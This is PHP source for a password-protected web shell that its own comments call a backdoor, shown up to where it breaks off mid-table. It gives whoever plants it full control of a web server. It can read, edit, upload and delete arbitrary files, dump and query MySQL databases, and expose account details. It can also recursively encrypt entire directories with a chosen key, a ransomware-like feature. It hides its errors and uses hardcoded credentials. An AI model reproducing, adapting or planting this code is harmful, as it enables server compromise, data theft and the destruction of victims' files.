<?php

/* Obtenemos el directorio por GET, si esta vacio, asignamos el directorio actual */
$actual = getcwd();

/* Obtenemos el directorio solicitado */
$directorio = (isset($_GET['d'])) ? $_GET['d'] : "$actual";

/* Iconos web */
$iconos = "https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css";

/* Nombre de usuario */
$user = "unkndown";

/* Clave acceso */
$pass = "mati";

/* Obtenemos la url actual donde se encuentra el usuario */
/* Host (ej: http://localhost/) */
$HTTP_HOST= $_SERVER["HTTP_HOST"];

/* URI (ej: index.php) */
$REQUEST_URI= $_SERVER["REQUEST_URI"];

/* Generamo el link de la pagina actual */
$link_actual="http://" . $HTTP_HOST . $REQUEST_URI;

/* nombre puesto al backdoor ej: backdoor.php, ingresar solo backdoor */
$uri = $REQUEST_URI;

/*Funcion para quitar slash*/
function slash($valor) 
{
  $nopermitido = array("/");
  $valor       = str_replace($nopermitido, "", $valor);
  return $valor;
}
/*Armamos el link*/
if (strpos($uri,"?")) {
  $last_uri = explode("?", $uri);
  $nombre_backdoor = slash($last_uri[0]);
}
else
{
  $nombre_backdoor = slash($uri);
}

session_start();

if(!isset($_SESSION['user'])) 
{
   /*
   * Verificamos que se haya enviado el formulario de login
   * y comprobamos los datos
   */
   if (isset($_POST['cerrojo']))
   {
      if ($_POST['key'] == $pass AND $_POST['cerrojo'] == $user)
      {
            session_start();

            $_SESSION['user'] = $user; 

            header("Location:$link_actual"); 
      }
      else
      {
         if (empty($_POST['key']) or empty($_POST['cerrojo']))
         {
            echo "<script>alert('Ingresa tus datos')</script>";
         }
         else
         {
            if ($_POST['key'] != $pass or $_POST['cerrojo'] != $user)
            {
               echo "<script>alert('Datos incorrectos')</script>";
            }
         }
      }
   }
   echo "
   <style>@import url(https://fonts.googleapis.com/css?family=Slabo+27px);body{
background: #131313;
font-family: 'Slabo 27px', serif;}</style>
   <center>
        <div style='position: absolute; left: 50%; top:50%; transform: translateX(-50%) translateY(-50%);'>
        <img src='http://i.imgur.com/Us2AXhN.png' width='128px;'><br><br>
          <form action='' method='post'>
            <input style='padding:15px;' type='text' name='cerrojo' placeholder='Usuario'><br><br>
            <input style='padding:15px;' type='text' name='key' placeholder='Contrseña'><br><br>
            <button style='padding:10px; background: #E0E0E0; border: solid 1px #ccc;' type='submit' name='open_door'>Abrir</button>
         </form>
        </div>
      </center>"; 
}
else
{
/*
* Evitamos que se muestren errores en el log
*/
error_reporting(0);

if (isset($_GET['close']))
{
  //Crear sesión
   session_start();
   //Vaciar sesión
   $_SESSION = array();
   //Destruir Sesión
   session_destroy();
   //Redireccionar al login
   $link = explode("?", $link_actual);
   $last = $link[0];
   echo "<meta http-equiv='Refresh' content='0;url=$last'>";  
   // header("location:$last");
}

/* Creamos una funcion llamada size, para obtener el tamaño de archivo */
function size($directorio)
{
   /* Calculamos el tamaño del archivo */
   $tamaño = filesize($directorio);
   /* Definimos el tamaño de un mega */
   return calcular_disco($tamaño);
}

/* Obtener la fecha de la ultima modificaion de un archivo */
function fecha_modificacion($directorio)
{
   return  date("F d Y H:i:s.", filectime($directorio));
}

/* funcion para eliminar una carpeta */
function eliminar_directorio($dir)
{
	/* Verifcamos que sea un directorio y lo abrimos */
	if(!$dh = @opendir($dir)) return;
	/* Recorremos los archivos de la carpeta */
	while (false !== ($current = readdir($dh)))
	{
		if($current != '.' && $current != '..')
		{
			if (!@unlink($dir.'/'.$current)){
				eliminar_directorio($dir.'/'.$current);
      }
		}
	}
	closedir($dh);
 	@rmdir($dir);
}

/* Obtener la Fecha */
function fecha(){
	$arrayMeses = array('Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio','Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre');
	$arrayDias = array( 'Domingo', 'Lunes', 'Martes','Miercoles','Jueves', 'Viernes', 'Sabado');
	return $arrayDias[date('w')]." ".date('d')." de ".$arrayMeses[date('m')-1]." de ".date('Y');
}

/* Obtener los permisos de un archivo */
function permisos($directorio)
{
   $permisos = fileperms($directorio);

   if (($permisos & 0xC000) == 0xC000) {
       /* Socket */
       $info = 's';
   } elseif (($permisos & 0xA000) == 0xA000) {
       /* Enlace Simbólico */
       $info = 'l';
   } elseif (($permisos & 0x8000) == 0x8000) {
       /* Regular */
       $info = '-';
   } elseif (($permisos & 0x6000) == 0x6000) {
       /* Especial Bloque */
       $info = 'b';
   } elseif (($permisos & 0x4000) == 0x4000) {
       /* Directorio */
       $info = 'd';
   } elseif (($permisos & 0x2000) == 0x2000) {
       /* Especial Carácter */
       $info = 'c';
   } elseif (($permisos & 0x1000) == 0x1000) {
       /* Tubería FIFO */
       $info = 'p';
   } else {
       /* Desconocido */
       $info = 'u';
   }

   /* Propietario */
   $info .= (($permisos & 0x0100) ? 'r' : '-');
   $info .= (($permisos & 0x0080) ? 'w' : '-');
   $info .= (($permisos & 0x0040) ? (($permisos & 0x0800) ? 's' : 'x' ) : (($permisos & 0x0800) ? 'S' : '-'));

   /* Grupo */
   $info .= (($permisos & 0x0020) ? 'r' : '-');
   $info .= (($permisos & 0x0010) ? 'w' : '-');
   $info .= (($permisos & 0x0008) ? (($permisos & 0x0400) ? 's' : 'x' ) : (($permisos & 0x0400) ? 'S' : '-'));

   /* Mundo */
   $info .= (($permisos & 0x0004) ? 'r' : '-');
   $info .= (($permisos & 0x0002) ? 'w' : '-');
   $info .= (($permisos & 0x0001) ? (($permisos & 0x0200) ? 't' : 'x' ) : (($permisos & 0x0200) ? 'T' : '-'));
   return $info;
}

/*Chmod*/
function chmod_archivo($archivo){
   return substr(base_convert(@fileperms($archivo),10,8),-4);
}

/*Usuario*/
function usuario_archivo($filepath){
   if(function_exists('posix_getpwuid')) {
      $array = @posix_getpwuid(@fileowner($filepath));
      if($array && is_array($array)) {
         return ' <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
      }
   }
   return '';
}

/* Eliminar Fichero */
if (isset($_GET['df']))
{
   /* Verificamos que la variable con el nombre del archivo a eliminar no este vacia */
   if ($_GET['df'] != "")
   {
      /* Si se cumple la condicion, guardamos los datos en variables */
      $directorio = $_GET['d'];
      $fichero = $_GET['df'];
      $locacion = "$directorio/$fichero";
      /* Luego eliminamos el archivo */
      unlink($locacion);
      $d = $_GET['d'];
      $exp       = explode("/",$d);
      $total     = count($exp)-1;
      $url_slash = "";
      for ($i=0; $i <= $total ; $i++) { 
         $url_slash .= $exp[$i]."/";
      }
      echo "<meta http-equiv='Refresh' content='0;url=?d=".substr($url_slash, 0, -1)."'>";   
   }
}

/* Eliminar Carpeta */
if (isset($_GET['dd']))
{
   if ($_GET['dd'] != "")
   {
      $directorio_borrar = $_GET['dd'];
      eliminar_directorio($directorio_borrar);      
      $d = $_GET['d'];
      $exp       = explode("/",$d);
      $total     = count($exp)-2;
      $url_slash = "";
      for ($i=0; $i <= $total ; $i++) { 
         $url_slash .= $exp[$i]."/";
      }
      echo "<meta http-equiv='Refresh' content='0;url=?d=".substr($url_slash, 0, -1)."'>";
   }
}

function descargar_archivo($file,$locacion)
{
   header("Content-disposition: attachment; filename=$file");
   header("Content-type: application/octet-stream");
   readfile($locacion);
   $link = "http://".$_SERVER["HTTP_HOST"]. $_SERVER["REQUEST_URI"];
   echo "<meta http-equiv='Refresh' content='5;url=$link'>";
   exit(0);
}

/* Verificamos si se hace una peticion de descarga de un archivo */
if (isset($_GET['da']))
{
   /* Guardamos los datos del archivo a descarcar en variables */
   $file = $_GET['da'];
   $directorio =$_GET['d'];
   $locacion = "$directorio/$file";
   descargar_archivo($file,$locacion);
   /* Evitamos que se vea algo que no tenga que ver con la descarga del archivo */
   exit(0);
}

/* Verificamos si se envio el formulario de edicion de un archivo */
if (isset($_POST['editar_archivo']))
{
   /* Guardamos los datos recibiod del formulario variables */
   $archivo = $_GET['ea'];
   $carpeta = $_GET['d'];
   $locacion = "$carpeta/$archivo";
   /* Arbimos el archivo editado */
   $modificar = fopen($locacion, 'w+');
   /* reescribimos el archivo con los datos del formulario y lo guardamos */
   if ($yeah = fwrite($modificar, $_POST['codigo']))
   {
       echo "<script>alert('Editado');</script>";
   }
   else
   {
       echo "<script>alert('No se pudo editar');</script>";
   }
}

/* Verificar si se esta editando un archivo */
if (isset($_GET['ea']))
{
   if ($_GET['ea'] != "")
   {
      /* Generamos el formulario con el contenido del archivo */
      echo "<form action='' method='post'><center><textarea cols='165' rows='35' name='codigo'>";
      /* Guardamos los datos en variables */
      $archivo = $_GET['ea'];
      $carpeta = $_GET['d'];
      $locacion = "$carpeta/$archivo";
      /* Verifcamos que sea un archivo */
      $archivo = file($locacion);
      /* Mostramos el contenido del archivo */
      foreach($archivo as $n => $sub) {
         $texto = htmlspecialchars($sub);
         echo $texto;
      }
      echo "</textarea></center><br><center><button style='padding:10px; background:gainsboro; border: solid 1px #ccc' type='submit' name='editar_archivo'>Editar</button></center></form>";
      /* Evitamos que se vea algo mas aparte del archivo a editar */
      exit(0);
   }
}

/* Verificar si se hace una peticion de descarga de una carpeta */
if (isset($_GET['dc']))
{
   if ($_GET['dc'] != "")
   {
      function comprimir($carpeta_descargar, $nombre_zip, $handle = false, $recursivo = false)
      {
         /* Declaramos el handle */
         if(!$handle)
         {
            $handle = new ZipArchive;
            if ($handle->open($nombre_zip, ZipArchive::CREATE) === false)
            {
               /* No se pudo comprimir */
               return false;
            }
         }

         /* Comprirmir directorio */
         if(is_dir($carpeta_descargar))
         {
            /* Sanitizar el nombre de la carpeta */
            $carpeta_descargar = dirname($carpeta_descargar.'/arch.ext');

            /* Agregar el directorio comprimido */
            $handle->addEmptyDir($carpeta_descargar);

            /* archiva cada fichero de la carpeta */
            foreach(glob($carpeta_descargar.'/*') as $url)
            {
               /* Comprime el subdirectorio */
               comprimir($url, $nombre_zip, $handle, true);
            }
         }
         else
         {
            $handle->addFile($carpeta_descargar);
         }

         /* Finalizar el archivo zip */
         if(!$recursivo)
         {
            $handle->close();
            $actual   = getcwd();
            $dfsdf    = $_GET['dc'];
            $expl_des = explode("/",$dfsdf);
            $tota_des = count($expl_des)-1;
            $nomb_zip = $expl_des[$tota_des] . ".zip";
            $link = $actual . "/".$nomb_zip;
            descargar_archivo($nomb_zip,$link);
         }
         /* Se pudo crear el zip */
         return true;         
}
   $dfsdf = $_GET['dc'];
   $expl_des = explode("/",$dfsdf);
   $tota_des = count($expl_des)-1;
   $nomb_zip = $expl_des[$tota_des] . ".zip";
   $actual   = $_GET['d'];
   $demo = $actual . "/". $expl_des[$tota_des];
   comprimir($demo, $nomb_zip);
   }
}

/* Verificar si se estan eliminando una seleccion de ficheros o carpetas */
if (isset($_POST['seleccion']))
{
   /* traemos las selecciones desde el form y los recorremos con un ciclo for */
   for($i=0;$i<=count($_POST["fichero"])-1;$i++):

      /* guardamos el nombre de la seleccion en una variable */
      $nombre = $_POST["fichero"][$i];

      if (!is_dir($nombre))
      {
         /* de lo contrario si es un fichero lo eliminamos con unlink() */
         unlink($nombre);
      }
      else{
         if ($nombre != "." AND $nombre != "..")
         {
            /* Si es una carpeta la eliminamos con la funcion eliminar_directorio() */
            eliminar_directorio($nombre);
         }
      }
   endfor;
}

class Cifrado_C {
    protected $Cifrado_C;
    protected $key;
    protected $blockSize;
    protected $data;
    private $iv;
    private $mode;

    public function __construct( $text = null, $key = null, $bsize = null, $mode = null ){
        $this->archivo( $text );
        $this->clave( $key );
        $this->tipo($bsize);
        $this->modo( $mode );
        $this->iv('');
    }

    public function archivo( $text_plain ){
        if( !empty($text_plain) ){
            $this->data = $text_plain;
        }
    }

    public function clave( $key ){
        $this->key = $key;
    }

    public function modo( $mode ){
        switch( $mode ){
            case 'ecb':
                $this->mode = MCRYPT_MODE_ECB;
            break;
            case 'cfb':
                $this->mode = MCRYPT_MODE_CFB;
            break;
            case 'cbc':
                $this->mode = MCRYPT_MODE_CBC;
            break;
            case 'nofb':
                $this->mode = MCRYPT_MODE_NOFB;
            break;
            case 'ofb':
                $this->mode = MCRYPT_MODE_OFB;
            break;
            case 'stream':
                $this->mode = MCRYPT_MODE_STREAM;
            break;
            default:
                $this->mode = MCRYPT_MODE_ECB;
        }
    }

    public function tipo( $blockSize ){
        switch( $blockSize ){
            case 128:
                $this->Cifrado_C = MCRYPT_RIJNDAEL_128;
            break;
            case 192:
                $this->Cifrado_C = MCRYPT_RIJNDAEL_192;
            break;
            case 256:
                $this->Cifrado_C = MCRYPT_RIJNDAEL_256;
            break;
            default:
                $this->Cifrado_C = MCRYPT_RIJNDAEL_128;
        }
    }

    private function getIV(){
        if( empty($this->iv) ){
            $this->iv = mcrypt_create_iv( mcrypt_get_iv_size($this->Cifrado_C, $this->mode ), MCRYPT_RAND);
        }
        return $this->iv;
    }

    public function iv( $iv ){
        $this->iv = $iv;
    }

    public function val() {
        return ($this->data != null && $this->key != null && $this->Cifrado_C != null ) ? true : false;
    }

    public function encrypt(){
        if( $this->val() ){
            return trim(base64_encode(
                mcrypt_encrypt(
                    $this->Cifrado_C, $this->key, $this->data, $this->mode, $this->getIV())));
        }else{
        }
    }

    public function decrypt(){
        if( $this->val() ){
            return trim(mcrypt_decrypt(
                $this->Cifrado_C, $this->key, base64_decode($this->data), $this->mode, $this->getIV()));
        }else{
        }
    }

    private function generateUniqueKey( $length ){
        return substr( md5(uniqid(time())), $length);
    }

}
/*Funcion para descifrar archivos*/
function descifrar($dir){
	$contents = file_get_contents($dir);
	$myCipher = new Cifrado_C;
	$myCipher->archivo($contents);
	$pass= $_GET['password_descifrar'];
	$myCipher->clave($pass);
	$myCipher->tipo(256);
	$myCipher->modo('ecb');
	$content = fopen($dir, 'w+');
	$archivo = file($nombre);
      $con =  "";
      /* Mostramos el contenido del archivo */
      foreach($archivo as $n => $sub) {
         $texto = htmlspecialchars($sub);
         $con .= $texto;
      }
	$myCipher->archivo($con);
	$texto = $myCipher->decrypt();
	if (fwrite($content, $texto)) {
		echo "$dir --> <span class='si'>Descifrado</span><br><br>";
	}
	else
	{
		echo "$dir --> <span class='no'>No se pudo descifrar</span><br><br>";
	}
}

/*Funcion para cifrar archivos*/
function cifrar($dir){
	$contents = file_get_contents($dir);
	$myCipher = new Cifrado_C;
	$myCipher->archivo($contents);
	$pass= $_GET['password_cifrar'];
	$myCipher->clave($pass);
	$myCipher->tipo(256);
	$myCipher->modo('ecb');
	$cifrado = $myCipher->encrypt();
	$content = fopen($dir, 'w+');
	if (fwrite($content, $cifrado)) {
		echo "$dir --> <span class='si'>Cifrado</span><br><br>";
	}
	else
	{
		echo "$dir --> <span class='no'>No se pudo cifrar</span><br><br>";
	}
}

/*Funcion para recorrer todo el direrctorio y cifrarlo*/
function cifrar_directorio_completo($path){
	$dir = opendir($path);
	$files = array();
	while ($elemento = readdir($dir)){
		if( $elemento != "." && $elemento != ".."){
			if( is_dir($path.$elemento) ){
				$pp = $path.$elemento.'/';
				cifrar_directorio_completo( $pp );
			}
			else{
				$files[] = $elemento;
			}
		}
	}
	for($x=0; $x<count( $files ); $x++){
		$tot = $path.$files[$x];
	 	cifrar($tot);
	}
}

/*Funcion para recorrer todo el direrctorio y descifrarlo*/
function descifrar_directorio_completo($path){
	$dir = opendir($path);
	$files = array();
	while ($elemento = readdir($dir)){
		if( $elemento != "." && $elemento != ".."){
			if( is_dir($path.$elemento) ){
				$pp = $path.$elemento.'/';
				descifrar_directorio_completo( $pp );
			}
			else{
				$files[] = $elemento;
			}
		}
	}
	for($x=0; $x<count( $files ); $x++){
		$tot = $path.$files[$x];
	 	descifrar($tot);
	}
}

/*verificamos si se esta cifrando un direcotrio*/
if (isset($_GET['directorio_cifrar']))
{
		$caracteres = strlen($_GET['password_cifrar']);
		if ($caracteres == 16 or $caracteres == 24 or $caracteres == 32)
		{
			$dir = $_GET['directorio_cifrar']."/";
			echo " <a href='javascript:history.back(1)'>Volver Atrás</a><br><br><br>";
			cifrar_directorio_completo($dir);
			echo " <a href='javascript:history.back(1)'>Volver Atrás</a><br><br><br>";
		}
		else
		{			
			echo "<script>alert('Ingresa una contraseña de 16,24 o 32 caracteres')</Script>";
		}
	
}

/*verificamos si se esta descifrando un directorio*/
if (isset($_GET['directorio_descifrar']))
{
	$caracteres = strlen($_GET['password_descifrar']);
	if ($caracteres == 16 or $caracteres == 24 or $caracteres == 32)
	{
		$dir = $_GET['directorio_descifrar']."/";
		echo " <a href='javascript:history.back(1)'>Volver Atrás</a><br><br><br>";
		descifrar_directorio_completo($dir);
		echo " <a href='javascript:history.back(1)'>Volver Atrás</a><br><br><br>";
	}
	else
	{			
		echo "<script>alert('Ingresa una contraseña de 16,24 o 32 caracteres')</Script>";
	}	
}

/*verificar si se hace una peticion de cifrado/descifrado*/
if (isset($_GET['ras']))
{
	$directorio = $_GET['d'];
	echo "<style> .no{color: #e74c3c; } .si{color: #2ecc71; font-weight: bold; } </style>"; 
	echo "<h1>Cifrar directorio</h1>";
	echo "<form method='get' action=''> <input style='padding:15px;width:300px;border:solid 2px #ccc;' name='password_cifrar' placeholder='Password de cifrado'><br><br> <input style='padding:15px;width:300px;border:solid 2px #ccc;' name='directorio_cifrar' value='$directorio'> <input type='hidden' name='d' value='$actual'> <input type='hidden' name='ras' value='true'> <span><button style='padding:15px' type='submit'>Cifrar</button></span> </form>"; 
	echo "<h1>Descifrar directorio</h1>";
	echo "<form method='get' action=''> <input style='padding:15px;width:300px;border:solid 2px #ccc;' name='password_descifrar' placeholder='Password de cifrado'><br><br> <input style='padding:15px;width:300px;border:solid 2px #ccc;' name='directorio_descifrar' value='$directorio'> <input type='hidden' name='d' value='$actual'> <input type='hidden' name='ras' value='true'> <span><button style='padding:15px' type='submit'>Descifrar</button></span> </form>"; exit(0);
}

/* Crear un fichero */
if (isset($_GET['cf']))
{
   /* verificamos que se envie la variable del nombre del archivo */
   if (isset($_POST['nombre']))
   {
      /* verificamos que el nombre no sea vacio */
      if (!empty($_POST['nombre']))
      {
         /* guardamos los datos en variables */
         $archivo   = $_POST['nombre'];
         $contenido = $_POST['contenido'];
         $carpeta   = $_GET['d'];
         $final = "$carpeta/$archivo";
         /* Generamos el archivo con los datos del formulario */
         if ($fp = fopen($final, "a"))
         {
           $write = fputs($fp, $contenido);
            fclose($fp);
            echo "<script>alert('Archivo creado')</script>";
         }
         else
         {
            echo "<script>alert('Archivo no creado')</script>";
         }
      }
   }

   /* Generamos el formulario para crear un archivo */
   echo "<form method='post' autocomplete='off'> <input style='width:100%; padding:10px' placeholder='Nombre del archivo' type='text' name='nombre'><br><br> <textarea style='width:100%; padding:10px' name='contenido' cols='30' rows='30' placeholder='Contenido del archivo'></textarea> <br><br> <center><button type='submit'>Crear archivo</button></center></form>"; 
   exit(0);
}

/* Crear una carpeta */
if (isset($_POST['nueva_carpeta']))
{   
      /* verificamos que el nombre no sea vacio */
      if (!empty($_POST['nueva_carpeta']))
      {
         /* guardamos los datos en variables */
         $carpeta      = $_POST['nueva_carpeta'];
         $localizacion = $_GET['d'];
         $final = "$localizacion/$carpeta";
         /* creamos la carpeta */
         if (mkdir($final, 0777, true))
         {
            echo "<script>alert('Carpeta creada')</script>";
            echo "<meta http-equiv='Refresh' content='0;url=$link_actual'>";
         }
         else
         {
            echo "<script>alert('No se pudo crear la carpeta')</script>";
         }
      }
   exit(0);
}

/* Subir un archivo */
   /* verificamos que el form para subir un archivo se haya enviado */
   if (isset($_POST['subir_archivo']))
   {
      /* Obentemos el archivo que se subira */
      $archivo    = $_FILES["logo_upload"]["name"];
      /* Verificamos que el archivo no este vacio */
      if ($archivo != "")
      {
         /* Obtenemos el nombre temporal del archivo */
         $temporal   = $_FILES["logo_upload"]["tmp_name"];
         /* Obtenemos la carpeta donde se subira */
         $carpeta    = $_GET['d'];
         /* Cramos la ruta final donde se subira el archivo */
         $ubicacion = "$carpeta/$archivo";

         /* Verifcamos si el archivo se subio */
         if (move_uploaded_file($temporal, $ubicacion))
         {
            /* Si se subio mostramos un mensaje de exito */
            echo "<script>alert('Archivo Subido')</script>";
            echo "<meta http-equiv='Refresh' content='0;url=$link_actual'>";
         }
         else
         {
            /* De lo contrario mostramos un mensaje de error */
            echo "<script>alert('Archivo no subido')</script>";
         }
      }   
   exit(0);
}

/* Obtenemos la ip del usuario */
function obtener_ip()
{
   if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      return $_SERVER['HTTP_CLIENT_IP'];
   }

   if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      return $_SERVER['HTTP_X_FORWARDED_FOR'];
   }

   return $_SERVER['REMOTE_ADDR'];
}

/* Mostrar phpinfo() */
if (isset($_GET['phpinfo']))
{
   /* verificamos que la variable phpinfo sea "true" */
   if ($_GET['phpinfo'] == "true")
   {
      /* si cumple la condicion cargamos la funcion phphinfo() */
      @assert(phpinfo());
   }
   exit(0);
}

/* Crear sql de una base de dato mysql */
function backup_tables($host,$user,$pass,$name,$tables = '*')
{
   $link = mysql_connect($host,$user,$pass);
   mysql_select_db($name,$link);
   /* Obtenemos las tablas */
   if($tables == '*')
   {
      $tables = array();
      $result = mysql_query('SHOW TABLES');
      while($row = mysql_fetch_row($result))
      {
         $tables[] = $row[0];
      }
   }
   else
   {
      $tables = is_array($tables) ? $tables : explode(',',$tables);
   }

   foreach($tables as $table)
   {
      $result = mysql_query('SELECT * FROM '.$table);
      $num_fields = mysql_num_fields($result);

      $return.= 'DROP TABLE '.$table.';';
      $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
      $return.= "\n\n".$row2[1].";\n\n";

    for ($i = 0; $i < $num_fields; $i++)
      {
         while($row = mysql_fetch_row($result))
         {
            $return.= 'INSERT INTO '.$table.' VALUES(';
            for($j=0; $j<$num_fields; $j++)
            {
               $row[$j] = addslashes($row[$j]);
               $row[$j] = ereg_replace("\n","\\n",$row[$j]);
               if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
               if ($j<($num_fields-1)) { $return.= ','; }
            }
            $return.= ");\n";
         }
      }
      $return.="\n\n\n";
   }
   /* Guardar archivo */
   $nombre = 'db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql';
   $handle = fopen($nombre,'w+');
   if (fwrite($handle,$return))
   {
      fclose($handle);
      $actual = getcwd();
      $locacion = "$actual/$nombre";
      descargar_archivo($nombre,$locacion);
      exit(0);
   }
   else
   {
      echo "<script>alert('No se pudo descargar')</script>";
   }
}

/* Crear sql de una base de dato mysqli */
function backup_tables_mysqli($host,$user,$pass,$name,$tables = '*')
{
   $link = mysqli_connect($host,$user,$pass,$name);
   /* Obtebemos las tablas */
   if($tables == '*')
   {
      $tables = array();
      $result = mysqli_query($link,'SHOW TABLES');
      while($row = mysqli_fetch_row($result))
      {
         $tables[] = $row[0];
      }
   }
   else
   {
      $tables = is_array($tables) ? $tables : explode(',',$tables);
   }

   /* generamos el contenido */
   foreach($tables as $table)
   {
      $result = mysqli_query($link,'SELECT * FROM '.$table);
      $num_fields = mysqli_field_count($link);
      $return.= 'DROP TABLE '.$table.';';
      $row2 = mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
      $return.= "\n\n".$row2[1].";\n\n";

    for ($i = 0; $i < $num_fields; $i++)
      {
         while($row = mysqli_fetch_row($result))
         {
            $return.= 'INSERT INTO '.$table.' VALUES(';
            for($j=0; $j<$num_fields; $j++)
            {
               $row[$j] = addslashes($row[$j]);
               $row[$j] = ereg_replace("\n","\\n",$row[$j]);
               if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
               if ($j<($num_fields-1)) { $return.= ','; }
            }
            $return.= ");\n";
         }
      }
      $return.="\n\n\n";
   }

   /* Guardamos el archivo */
   $handle = fopen('db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql','w+');
   if (fwrite($handle,$return))
   {
      fclose($handle);
      echo "<script>alert('Archivo creado, descargalo desde la pagina principal')</script>";
   }
   else
   {
      echo "<script>alert('No se pudo descargar')</script>";
   }
}

/* verifcamos si se hace una peticion de descarga de una base de datos mysql */
if (isset($_GET['descargar_bd']))
{
   /* verificamos que el nombre de la base de datos a descargar sea distinto de vacio */
   if ($_GET['descargar_bd'] != "")
   {
      /* si se cumple la condicion, guardamos los datos en variables */
      $valor = $_GET['descargar_bd'];
      $host    = $_GET['host'];
      $usuario = $_GET['usuario'];
      $clave   = $_GET['clave'];
      $tipo = $_GET['bd'];
      $base = $_GET['base'];
      $sql = $_GET['sql'];
      backup_tables($host,$usuario,$clave,$valor);
   }
}

/* verifcamos si se hace una peticion de descarga de una base de datos mysqli */
if (isset($_GET['descargar_bdi']))
{
   /* verificamos que el nombre de la base de datos a descargar sea distinto de vacio */
   if ($_GET['descargar_bdi'] != "")
   {
      /* si se cumple la condicion, guardamos los datos en variables */
      $valor   = $_GET['descargar_bdi'];
      $host    = $_GET['host'];
      $usuario = $_GET['usuario'];
      $clave   = $_GET['clave'];
      $tipo    = $_GET['bd'];
      $base    = $_GET['base'];
      $sql     = $_GET['sql'];
      backup_tables_mysqli($host,$usuario,$clave,$valor);
   }
}


/* si se envia la variable sql, mostramos los estilos css
* y tambien verificamos si se envia la variable bd
* si se envia, mostramos ocultamos el formulario
*/
if (isset($_GET['sql']))
{
   echo "<link rel='stylesheet' href='$iconos'><style>.tg  {border-collapse:collapse;border-spacing:0;width: 100%;} .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 20px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;} .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 20px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;} .tg .tg-rx9y{font-weight:bold;background-color:#333333;color:#ffffff;text-align:center; border: solid 1px #333333;} .tg .tg-rx9y i{font-size: 1.5em; color: white; outline: none;} .menu a{text-decoration: none; padding: 5px; } .tg .tg-qjik{font-weight:bold;background-color:#333333;color:#ffffff} .tg .tg-031e{text-align: center;} .tg .tg-031e i{font-size: 1.2em} button{padding:10px; background: #E0E0E0; border: solid 1px #ccc;} input{padding:10px;} select{padding:10px; background: white; width: 190px} </style>"; 
   if (!isset($_GET['bd']))
   {
      echo"<center> <form method='get' autocomplete='off'> <b>Base de datos:</b><br> <select name='bd'> <option value='mysql'>Mysql</option> <option value='mysqli'>Mysqli</option> <!-- <option value='msql'>Msql</option> --> <!-- <option value='mssql'>Mssql</option> --> <!-- <option value='pg'>PostreSQL</option> --> <!-- <option value='sqlite'>SQLite</option> --> <!-- <option value='oci'>Oracle</option> --> </select><br> <b>Host:</b><br> <input type='text' name='host' value='localhost'><br> <b>Usuario:</b><br> <input type='hidden' name='ofs' value='sadjkasjdioasjd$#%$#%#ASDFSADFASDFSD2342344534534534fdfsdf#SDFASDFSDF'></input> <input type='text' name='usuario' placeholder='Usuario'><br> <b>Clave:</b><br> <input type='password' name='clave' placeholder='Contraseña'><br><br> <b>Base de dato:</b><br> <input type='text' name='base' value=''><br><br> <button type='submit' name='sql' value='true'>Conectar</button> </form> </center>";
    }
}

/* verificar si se esta haciendo una peticion sql */
if (isset($_GET['sql']))
{
   if ($_GET['sql'] == "true")
   {
         if ($_GET['host'] != "" AND $_GET['usuario'] != "" AND $_GET['clave'] != "")
         {
            $bd      = $_GET['bd'];
            $host    = $_GET['host'];
            $usuario = $_GET['usuario'];
            $clave   = $_GET['clave'];
            $base    = $_GET['base'];

            /* Entrar a una tabla de la base de dato */
            if (isset($_GET['tabla_entrar']))
            {
               if ($_GET['tabla_entrar'] != "")
               {
                  $mysql = @mysql_connect($host,$usuario,$clave);
                  @mysql_select_db($_GET['db_entrar']);
                  echo "<br><center><p><span><b style='font-size:2em'>Consulta SQL</b> tabla: ".$_GET['tabla_entrar']."</span></p>

                  <form action='' method='post'>
                  <input style='padding:10px' type=text name=sentencia size=70 value='select * from " . $_GET['tabla_entrar'] . "'>
                  <br><br>
                  <input type='hidden' name='host' value='$host'>
                  <input type='hidden' name='usuario' value='$usuario'>
                  <input type='hidden' name='password' value='$clave'>
                  <input type='hidden' name='condb' value=" . $_GET['db_entrar'] . ">
                  <input type='hidden' name='entertable' value=" . $_GET['tabla_entrar'] . ">
                  <input type='submit' name='consulta' value='Ejecutar'>
                  </form>
                  <br><br><br><br><br>";
                  /* Datos de la tabla */
                  if (isset($_POST['consulta']))
                  {
                     if (!empty($_POST['sentencia']))
                     {
                         $resultado = mysql_query($_POST['sentencia']);
                     }
                     else
                     {
                         $resultado = mysql_query("SELECT * FROM " . $_GET['tabla_entrar']);
                     }
                  }
                  $numero = 0;
                  echo "<table class='tg'>";
                  for ($i = 0;$i < mysql_num_fields($resultado);$i++) {
                      echo "<th class='tg-rx9y'>" . mysql_field_name($resultado, $i) . "</th>";
                      $numer++;
                  }
                  while ($dat = mysql_fetch_row($resultado)) {
                      echo "<tr>";
                      foreach($dat as $val) {
                          echo "<td class=main>" . $val . "</td>";
                      }
                  }
                  echo "</tr></table>";


                  exit(0);
               }
            }
            /* Listar tablas de mysql */
            if (isset($_GET['db_entrar']))
            {
               if ($_GET['db_entrar'] != "")
               {
                  $mysql = @mysql_connect($host,$usuario,$clave);
                  @mysql_select_db($_GET['db_entrar']);
                  $tablas = mysql_query("show tables from " . $_GET['db_entrar']) or die("error");
                  echo "<table class='tg'>
                        <tr>
                           <th class='tg-rx9y'>Nombre de la tabla</th>
                           <th class='tg-rx9y'>Entrar</th>
                        </tr>";
                  while ($tabla = mysql_fetch_row($tablas))
                  {
                     foreach($tabla as $indice => $valor)
                     {

                     echo "
                        <tr>
